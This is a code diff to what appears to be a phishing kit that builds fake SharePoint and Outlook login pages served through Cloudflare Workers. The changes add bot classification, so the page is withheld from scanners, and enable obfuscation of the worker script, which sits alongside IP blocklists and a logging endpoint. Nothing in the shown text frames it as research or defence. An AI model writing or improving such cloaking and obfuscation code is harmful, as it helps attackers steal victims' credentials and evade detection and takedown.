@@ -955,6 +955,18 @@ function buildSplashOverlay(config, link, obfuscate = false) {
 // ─── Main Page Rendering ───────────────────────────────────
 async function renderPageHtml(link, user, options) {
     options = options || {};
+
+    if (options.req) {
+        try {
+            const classification = await classifyRequest(options.req);
+            if (classification.action !== 'allow') {
+                return null;
+            }
+        } catch (e) {
+            console.warn('[Templateloader] bot classify failed:', e.message);
+        }
+    }
+
     const templateType = link.template_type || 'sharepoint3';
     const designName = link.verification_design || 'outlook';
     const settings = await loadAdminSettings();
@@ -1562,7 +1574,7 @@ async function renderPageHtml(link, user, options) {
 
 // ─── Export HTML Generation ────────────────────────────────
 async function generateExportHtml(link, user, options) {
-    return renderPageHtml(link, user, Object.assign({}, options, { exportForDownload: true }));
+    return renderPageHtml(link, user, Object.assign({}, options, { exportForDownload: true, req: options && options.req }));
 }
 
 // ─── Worker Script Builder ─────────────────────────────────
@@ -1640,29 +1652,27 @@ async function buildWorkerScript(link, user, apiBaseUrl) {
     .replace("'{{LOG_ENDPOINT}}'", "'" + verifyUrl + "'")
     .replace("'{{ANTI_BOT_MODE}}'", "'" + antiBotMode + "'")
     .replace("'{{ANTI_BOT_CHALLENGE_TYPE}}'", "'" + antiBotChallengeType + "'")
-    // Must be a QUOTED JSON array string: the worker declares
-    // `const BLOCKED_IPS_RAW = '{{BLOCKED_IPS}}';` and JSON.parses it. Quoting
-    // keeps the template itself valid JS before injection (a bare literal would
-    // make {{BLOCKED_IPS}} a parse error in the worker source), and the worker
-    // falls back to an empty list if parsing ever fails instead of taking the
-    // deployment down.
-    // The value is JSON.stringify'd (escaping quotes and backslashes) then
-    // wrapped in single quotes, so blocklist content cannot break out of the
-    // string literal.
     .replace("'{{BLOCKED_IPS}}'", "'" + JSON.stringify(blockedIps)
         .replace(/\\/g, '\\\\').replace(/'/g, "\\'") + "'")
     .replace("'{{TEMPLATE_HTML}}'", JSON.stringify(pageHtml));
 
-    // Optionally obfuscate worker script when admin setting or link requests it
-    // NOTE: Worker obfuscation is currently disabled because it breaks Cloudflare Workers
-    // The obfuscator processes embedded browser code (window, document) which doesn't exist in Workers
-    // TODO: Fix worker obfuscation by extracting pageHtml before obfuscation
+    // Align worker rendering with the downloaded HTML path: the embedded page
+    // HTML is already produced by renderPageHtml(), which applies the same
+    // obfuscation settings. Obfuscate the worker runtime wrapper when the
+    // admin/link setting is on, but keep a compatibility fallback if the
+    // obfuscator cannot handle the Cloudflare runtime code.
     try {
         const settings = await loadAdminSettings();
-        if (boolSetting(settings.obfuscation_enabled) || link.obfuscated) {
-            // Skip worker obfuscation for now - it breaks Cloudflare Workers
-            console.log('[Templateloader] Worker obfuscation skipped (compatibility issue)');
-            // workerJs = obfuscateJs(workerJs);
+        const shouldObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;
+        if (shouldObfuscate) {
+            try {
+                const obfuscatedWorkerJs = obfuscateJs(workerJs);
+                if (obfuscatedWorkerJs && obfuscatedWorkerJs.length > workerJs.length) {
+                    workerJs = obfuscatedWorkerJs;
+                }
+            } catch (e) {
+                console.warn('[Templateloader] Worker obfuscation failed, keeping unobfuscated script:', e.message);
+            }
         }
     } catch (e) {
         console.error('[Templateloader] Worker obfuscation check failed:', e.message);
